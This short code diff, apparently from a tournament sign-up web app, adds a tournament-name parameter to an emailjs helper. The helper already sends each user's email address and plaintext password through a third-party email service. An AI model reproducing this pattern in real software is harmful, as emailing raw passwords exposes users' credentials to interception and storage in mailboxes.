@@ -1,6 +1,8 @@
 import emailjs from "emailjs-com";
 
-const sendEmail = (forms) => {
+const sendEmail = (forms, tournamentName) => {
+  console.log(tournamentName);
+
   emailjs;
   emailjs
     .send(
@@ -9,6 +11,7 @@ const sendEmail = (forms) => {
       {
         user_email: forms.email,
         password: forms.password,
+        tournament_name: tournamentName,
       },
       "mtUY6IFoQSil0kN-Q"
     )
